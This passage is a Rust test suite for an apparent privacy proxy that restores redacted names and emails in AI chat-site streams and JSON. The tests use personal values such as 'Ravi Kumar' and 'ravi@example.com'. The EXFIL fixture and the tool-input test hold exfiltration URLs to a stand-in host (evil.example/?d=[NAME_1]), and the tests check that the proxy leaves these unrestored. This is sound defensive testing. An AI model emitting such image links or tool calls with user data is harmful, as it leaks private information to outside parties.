                    {"p": "/message/metadata", "o": "append", "v": {}}]}),
            };
            evs.push((Some("delta"), data.to_string()));
            if i % 4 == 3 {
                evs.push((
                    None,
                    json!({"type": "server_ste_metadata", "metadata": {"turn": i}}).to_string(),
                ));
            }
        }
        evs.push((
            Some("delta"),
            json!({"p": "/message/status", "o": "replace", "v": "finished_successfully"})
                .to_string(),
        ));
        evs.push((
            None,
            json!({"type": "message_stream_complete", "conversation_id": "c1"}).to_string(),
        ));
        evs.push((None, "[DONE]".to_string()));
        sse(&evs)
    }

    /// The text a claude.ai client builds from `completion` events and
    /// `content_block_delta` text deltas.
    fn claude_text(out: &[u8]) -> String {
        let mut text = String::new();
        for ev in events(out) {
            let Ok(v) = serde_json::from_str::<Value>(&ev.data) else {
                continue;
            };
            match v["type"].as_str() {
                Some("completion") => text.push_str(v["completion"].as_str().unwrap_or("")),
                Some("content_block_delta") => {
                    text.push_str(v["delta"]["text"].as_str().unwrap_or(""))
                }
                _ => {}
            }
        }
        text
    }

    fn claude_stream(pieces: &[&str], blocks: bool) -> Vec<u8> {
        let mut evs = vec![(
            Some("message_start"),
            json!({"type": "message_start", "message": {"id": "msg_1", "content": []}}).to_string(),
        )];
        if blocks {
            evs.push((
                Some("content_block_start"),
                json!({"type": "content_block_start", "index": 0,
                       "content_block": {"type": "text", "text": ""}})
                .to_string(),
            ));
        }
        for (i, piece) in pieces.iter().enumerate() {
            if i == 1 {
                evs.push((Some("ping"), json!({"type": "ping"}).to_string()));
            }
            let data = if blocks {
                json!({"type": "content_block_delta", "index": 0,
                       "delta": {"type": "text_delta", "text": piece}})
            } else {
                json!({"type": "completion", "completion": piece, "stop_reason": null,
                       "log_id": "abc", "messageLimit": {"type": "within_limit"}})
            };
            let name = if blocks {
                "content_block_delta"
            } else {
                "completion"
            };
            evs.push((Some(name), data.to_string()));
        }
        if blocks {
            evs.push((
                Some("content_block_stop"),
                json!({"type": "content_block_stop", "index": 0}).to_string(),
            ));
        }
        evs.push((
            Some("message_stop"),
            json!({"type": "message_stop"}).to_string(),
        ));
        sse(&evs)
    }

    #[test]
    fn chatgpt_delta_encoding_restores_a_tag_split_across_three_events() {
        let dir = tempfile::tempdir().unwrap();
        let e = tagged(dir.path());
        let pieces = ["Sure, I will email [NA", "ME_", "1] at [EMAIL_1] now."];
        let body = chatgpt_stream(&pieces);
        for n in [1, 2, 3, 7, 64, body.len()] {
            let out = run(&e, "text/event-stream; charset=utf-8", &body, n);
            assert_eq!(
                chatgpt_text(&out),
                "Sure, I will email Ravi Kumar at ravi@example.com now.",
                "chunks of {n}"
            );
            // No event is invented or lost.
            assert_eq!(events(&out).len(), events(&body).len());
        }
    }

    #[test]
    fn claude_completion_and_content_block_deltas_restore_split_tags() {
        let dir = tempfile::tempdir().unwrap();
        let e = tagged(dir.path());
        let pieces = ["Hello [NAM", "E_1], your mail is [EM", "AIL_1]."];
        for blocks in [false, true] {
            let body = claude_stream(&pieces, blocks);
            for n in [1, 5, body.len()] {
                let out = run(&e, "text/event-stream", &body, n);
                assert_eq!(
                    claude_text(&out),
                    "Hello Ravi Kumar, your mail is ravi@example.com.",
                    "blocks {blocks}, chunks of {n}"
                );
            }
        }
    }

    #[test]
    fn a_held_back_tail_is_flushed_into_the_last_event() {
        let dir = tempfile::tempdir().unwrap();
        let e = tagged(dir.path());
        // The stream ends inside something that looks like a tag.
        let body = sse(&[
            (
                None,
                json!({"type": "completion", "completion": "see [NAME_1] and [NA"}).to_string(),
            ),
            (
                None,
                json!({"type": "completion", "completion": "ME"}).to_string(),
            ),
        ]);
        let out = run(&e, "text/event-stream", &body, 3);
        assert_eq!(claude_text(&out), "see Ravi Kumar and [NAME");
        assert_eq!(events(&out).len(), 2);
        // Plain data lines share one restorer per stream.
        let body = b"data: Hi [NA\n\ndata: ME_1]!\n\ndata: [EMA\n\n";
        let out = run(&e, "text/event-stream", body, 4);
        let text: String = events(&out).into_iter().map(|ev| ev.data).collect();
        assert_eq!(text, "Hi Ravi Kumar![EMA");
    }

    #[test]
    fn cumulative_snapshots_restore_whole() {
        let dir = tempfile::tempdir().unwrap();
        let e = tagged(dir.path());
        // Each event carries the whole answer so far.
        let snaps = [
            "Hi [NA",
            "Hi [NAME_1], wr",
            "Hi [NAME_1], write to [EMAIL_1]",
        ];
        let body = sse(&snaps
            .iter()
            .map(|s| (None, json!({"answer": {"text": s}, "step": 1}).to_string()))
            .collect::<Vec<_>>());
        let out = run(&e, "text/event-stream", &body, 6);
        let texts: Vec<String> = events(&out)
            .iter()
            .map(|ev| {
                let v: Value = serde_json::from_str(&ev.data).unwrap();
                v["answer"]["text"].as_str().unwrap().to_string()
            })
            .collect();
        assert_eq!(
            texts.last().unwrap(),
            "Hi Ravi Kumar, write to ravi@example.com"
        );
        assert_eq!(texts[1], "Hi Ravi Kumar, wr");
    }

    #[test]
    fn ndjson_token_lines_restore_per_path() {
        let dir = tempfile::tempdir().unwrap();
        let e = tagged(dir.path());
        let mut body = String::new();
        for t in ["Dear [", "NAME", "_1", "], ok"] {
            body.push_str(&json!({"result": {"response": {"token": t}}}).to_string());
            body.push('\n');
        }
        body.push_str("{\"result\": {\"done\": true}}");
        let out = run(&e, "application/x-ndjson", body.as_bytes(), 5);
        let out = String::from_utf8(out).unwrap();
        let text: String = out
            .lines()
            .filter_map(|l| serde_json::from_str::<Value>(l).ok())
            .filter_map(|v| {
                v["result"]["response"]["token"]
                    .as_str()
                    .map(str::to_string)
            })
            .collect();
        assert_eq!(text, "Dear Ravi Kumar, ok");
        assert!(out.ends_with("{\"result\": {\"done\": true}}"));
    }

    #[test]
    fn json_documents_restore_every_leaf() {
        let dir = tempfile::tempdir().unwrap();
        let e = tagged(dir.path());
        // A chatgpt.com conversation history.
        let raw = r#"{"title":"Mail for [NAME_1]","mapping":{"a":{"message":{"content":{"parts":["Write to [EMAIL_1]"]},"weight":1.0}}},"big":123456789012345678901234567890}"#;
        for n in [1, 9, raw.len()] {
            let out = run(&e, "application/json", raw.as_bytes(), n);
            assert_eq!(
                String::from_utf8(out).unwrap(),
                raw.replace("[NAME_1]", "Ravi Kumar")
                    .replace("[EMAIL_1]", "ravi@example.com")
            );
        }
        // Nothing to restore: the exact bytes.
        let raw = "{ \"a\" : \"\\u0041\" }";
        assert_eq!(
            run(&e, "application/json", raw.as_bytes(), 2),
            raw.as_bytes()
        );
        // A value with a quote and a backslash is restored exactly and the
        // JSON stays valid, also inside JSON carried in a string.
        let q = quoted_tag(&e);
        let inner = json!([[format!("at {q}")]]).to_string();
        let doc = json!({"t": format!("{q} says"), "inner": inner}).to_string();
        for n in [1, 4, doc.len()] {
            let out = run(&e, "application/json", doc.as_bytes(), n);
            let v: Value = serde_json::from_slice(&out).unwrap();
            assert_eq!(v["t"], format!("{QUOTED} says"));
            let inner: Value = serde_json::from_str(v["inner"].as_str().unwrap()).unwrap();
            assert_eq!(inner[0][0], format!("at {QUOTED}"));
        }
        // Gemini-style `)]}'` JSON-in-text: line by line, JSON in strings
        // restored at its own level.
        let body = ")]}'\n\n42\n[[\"wrb.fr\",null,\"[[\\\"Hi [NAME_1]\\\"]]\"]]\n";
        let out = run(&e, "application/json; charset=utf-8", body.as_bytes(), 3);
        assert_eq!(
            String::from_utf8(out).unwrap(),
            body.replace("[NAME_1]", "Ravi Kumar")
        );
        let line = json!(["wrb.fr", null, json!([[format!("Hi {q}")]]).to_string()]).to_string();
        let body = format!(")]}}'\n\n9\n{line}\n");
        let out = String::from_utf8(run(&e, "application/json", body.as_bytes(), 5)).unwrap();
        let last: Value = serde_json::from_str(out.lines().nth(3).unwrap()).unwrap();
        let inner: Value = serde_json::from_str(last[2].as_str().unwrap()).unwrap();
        assert_eq!(inner[0][0], format!("Hi {QUOTED}"));
        // Not JSON after all: passed through, never spliced into.
        let out = run(&e, "application/json", b"oops [NAME_1]", 4);
        assert_eq!(out, b"oops [NAME_1]");
    }

    #[test]
    fn text_bodies_restore_and_binary_passes() {
        let dir = tempfile::tempdir().unwrap();
        let e = tagged(dir.path());
        let body = "<p>Hi [NAME_1] — [name_1]</p>";
        for ct in ["text/plain", "text/plain; charset=utf-8"] {
            for n in 1..6 {
                let out = run(&e, ct, body.as_bytes(), n);
                assert_eq!(
                    String::from_utf8(out).unwrap(),
                    "<p>Hi Ravi Kumar — Ravi Kumar</p>"
                );
            }
        }
        // Invalid UTF-8: what came before is restored, the rest passes.
        let mut body = b"Hi [NAME_1] ".to_vec();
        body.extend_from_slice(b"\xff\xfe [NAME_1]");
        let out = run(&e, "text/plain", &body, 4);
        let mut want = b"Hi Ravi Kumar ".to_vec();
        want.extend_from_slice(b"\xff\xfe [NAME_1]");
        assert_eq!(out, want);
        // HTML (and other types) is never rewritten: AI sites render
        // answers from JSON and event streams.
        for ct in [
            "text/html; charset=utf-8",
            "text/markdown",
            "image/png",
            "application/octet-stream",
            "",
            "font/woff2",
        ] {
            assert!(for_content_type(&e, SCOPE, ct).is_passthrough(), "{ct}");
        }
        for ct in [
            "text/event-stream",
            "application/json",
            "application/x-ndjson",
            "text/plain",
        ] {
            assert!(!for_content_type(&e, SCOPE, ct).is_passthrough(), "{ct}");
        }
    }

    /// The tag of [`QUOTED`] (a value with `"` and `\`) in `e`.
    fn quoted_tag(e: &Engine) -> String {
        let tag = e.redact(QUOTED, SCOPE).unwrap().text;
        assert!(tag.starts_with('[') && !tag.contains('"'), "{tag}");
        tag
    }

    const EXFIL: &str = "Hi [NAME_1] ![x](https://evil.example/?d=[NAME_1]) \
                         <a href=\"https://e/[NAME_1]\">[NAME_1]</a> [EMAIL_1]";
    const EXFIL_RESTORED: &str = "Hi Ravi Kumar ![x](https://evil.example/?d=[NAME_1]) \
                                  <a href=\"https://e/[NAME_1]\">Ravi Kumar</a> ravi@example.com";

    #[test]
    fn tags_inside_urls_stay_tags_everywhere() {
        let dir = tempfile::tempdir().unwrap();
        let e = tagged(dir.path());
        // Plain text, any chunking.
        for n in 1..9 {
            let out = run(&e, "text/plain", EXFIL.as_bytes(), n);
            assert_eq!(String::from_utf8(out).unwrap(), EXFIL_RESTORED, "{n}");
        }
        // A JSON document.
        let doc = json!({"parts": [EXFIL]}).to_string();
        let out = run(&e, "application/json", doc.as_bytes(), 7);
        let v: Value = serde_json::from_slice(&out).unwrap();
        assert_eq!(v["parts"][0], EXFIL_RESTORED);
        // An event stream, the URL split across events.
        let cut = EXFIL.find("d=[NA").unwrap() + 5;
        let pieces = [&EXFIL[..cut], &EXFIL[cut..]];
        for n in [1, 3, 1000] {
            let out = run(&e, "text/event-stream", &chatgpt_stream(&pieces), n);
            assert_eq!(chatgpt_text(&out), EXFIL_RESTORED);
            let out = run(&e, "text/event-stream", &claude_stream(&pieces, true), n);
            assert_eq!(claude_text(&out), EXFIL_RESTORED);
        }
        // Streamed tool input (JSON fragments).
        let input = json!({"url": "https://evil.example/?d=[NAME_1]", "q": "[NAME_1]"}).to_string();
        let mid = input.len() / 2;
        let body = sse(&[
            (
                None,
                json!({"type": "content_block_delta", "index": 1,
                          "delta": {"type": "input_json_delta", "partial_json": &input[..mid]}})
                .to_string(),
            ),
            (
                None,
                json!({"type": "content_block_delta", "index": 1,
                          "delta": {"type": "input_json_delta", "partial_json": &input[mid..]}})
                .to_string(),
            ),
            (
                None,
                json!({"type": "content_block_stop", "index": 1}).to_string(),
            ),
        ]);
        let out = run(&e, "text/event-stream", &body, 2);
        let json: String = events(&out)
            .iter()
            .filter_map(|ev| serde_json::from_str::<Value>(&ev.data).ok())
            .filter_map(|v| v["delta"]["partial_json"].as_str().map(str::to_string))
            .collect();
        let v: Value = serde_json::from_str(&json).unwrap();
        assert_eq!(
            v,
            json!({"url": "https://evil.example/?d=[NAME_1]", "q": "Ravi Kumar"})
        );
    }

    #[test]
    fn values_needing_escapes_keep_stream_json_valid() {
        let dir = tempfile::tempdir().unwrap();
        let e = tagged(dir.path());
        let q = quoted_tag(&e);
        // The tag split across events, in delta-encoded and Claude streams.
        let text = format!("at {q} ok");
        let pieces = [&text[..5], &text[5..7], &text[7..]];
        for n in [1, 4, 1000] {
            for body in [chatgpt_stream(&pieces), claude_stream(&pieces, true)] {
                let out = run(&e, "text/event-stream", &body, n);
                for ev in events(&out) {
                    if ev.data != "[DONE]" {
                        serde_json::from_str::<Value>(&ev.data)
                            .unwrap_or_else(|err| panic!("{err}: {}", ev.data));
                    }
                }
                let got = if body == chatgpt_stream(&pieces) {
                    chatgpt_text(&out)
                } else {
                    claude_text(&out)
                };
                assert_eq!(got, format!("at {QUOTED} ok"));
            }
        }
        // Tool input fragments are JSON-escaped.
        let input = json!({"addr": q}).to_string();
        let body = sse(&[
            (
                None,
                json!({"type": "content_block_delta", "index": 0,
                          "delta": {"type": "input_json_delta", "partial_json": &input[..9]}})
                .to_string(),
            ),
            (
                None,
                json!({"type": "content_block_delta", "index": 0,
                          "delta": {"type": "input_json_delta", "partial_json": &input[9..]}})
                .to_string(),
            ),
        ]);
        let out = run(&e, "text/event-stream", &body, 3);
        let json: String = events(&out)
            .iter()
            .filter_map(|ev| serde_json::from_str::<Value>(&ev.data).ok())
            .filter_map(|v| v["delta"]["partial_json"].as_str().map(str::to_string))
            .collect();
        let v: Value = serde_json::from_str(&json).unwrap_or_else(|err| panic!("{err}: {json}"));
        assert_eq!(v["addr"], QUOTED);
        // NDJSON: parsed per line; a line that is not JSON passes through.
        let body = format!(
            "{}\nnot json [NAME_1]\n{}\n",
            json!({"t": format!("{q} [NAME_1]")}),
            json!({"t": "[EMAIL_1]"})
        );
        let out = String::from_utf8(run(&e, "application/x-ndjson", body.as_bytes(), 6)).unwrap();
        let lines: Vec<&str> = out.lines().collect();
        let first: Value = serde_json::from_str(lines[0]).unwrap();
        assert_eq!(first["t"], format!("{QUOTED} Ravi Kumar"));
        assert_eq!(lines[1], "not json [NAME_1]");
        let last: Value = serde_json::from_str(lines[2]).unwrap();
        assert_eq!(last["t"], "ravi@example.com");
    }

    /// Split `text` at the char boundaries in `cuts` (byte offsets, any order).
    fn split_at(text: &str, cuts: &[usize]) -> Vec<String> {
        let mut at: Vec<usize> = cuts
            .iter()
            .map(|c| c % (text.len() + 1))
            .filter(|c| text.is_char_boundary(*c))
            .collect();
        at.sort_unstable();
        at.dedup();
        let mut out = Vec::new();
        let mut last = 0;
        for c in at {
            out.push(text[last..c].to_string());
            last = c;
        }
        out.push(text[last..].to_string());
        out
    }

    fn arb_text() -> impl Strategy<Value = String> {
        let token = prop_oneof![
            Just("[NAME_1]".to_string()),
            Just("[name_1]".to_string()),
            Just("[EMAIL_1]".to_string()),
            Just("[NAME_2]".to_string()),
            Just("[".to_string()),
            Just("]".to_string()),
            Just("NAME".to_string()),
            Just(" ".to_string()),
            Just("é".to_string()),
            Just("![i](".to_string()),
            Just("https://".to_string()),
            Just(" <a href=\"".to_string()),
            Just("\"".to_string()),
            Just("\n[1]: ".to_string()),
            Just(")".to_string()),
            "[a-z ]{1,6}",
        ];
        proptest::collection::vec(token, 0..14).prop_map(|v| v.concat())
    }

    /// One tagged engine for every property-test case.
    fn shared_engine() -> &'static Engine {
        static ENGINE: std::sync::OnceLock<(tempfile::TempDir, Engine)> =
            std::sync::OnceLock::new();
        let (_, e) = ENGINE.get_or_init(|| {
            let dir = tempfile::tempdir().unwrap();
            let e = tagged(dir.path());
            (dir, e)
        });
        e
    }

    proptest! {
        #![proptest_config(ProptestConfig::with_cases(512))]

        /// For any split of the answer into events and any chunking of the
        /// stream, the client's text equals restoring the whole text.
        #[test]
        fn sse_restore_under_any_chunking_equals_whole_text_restore(
            text in arb_text(),
            cuts in proptest::collection::vec(0usize..200, 0..8),
            chunk in 1usize..40,
        ) {
            let e = shared_engine();
            // Whole-text restore, tags inside URLs left alone.
            let mut whole = Guarded::new(e.stream_restorer(SCOPE));
            let mut want = whole.push(&text);
            want.push_str(&whole.finish());
            let pieces = split_at(&text, &cuts);
            let refs: Vec<&str> = pieces.iter().map(String::as_str).collect();
            let out = run(e, "text/event-stream", &chatgpt_stream(&refs), chunk);
            prop_assert_eq!(chatgpt_text(&out), want.clone());
            let out = run(e, "text/event-stream", &claude_stream(&refs, true), chunk);
            prop_assert_eq!(claude_text(&out), want.clone());
            let out = run(e, "text/event-stream", &claude_stream(&refs, false), chunk);
            prop_assert_eq!(claude_text(&out), want);
        }
    }
}
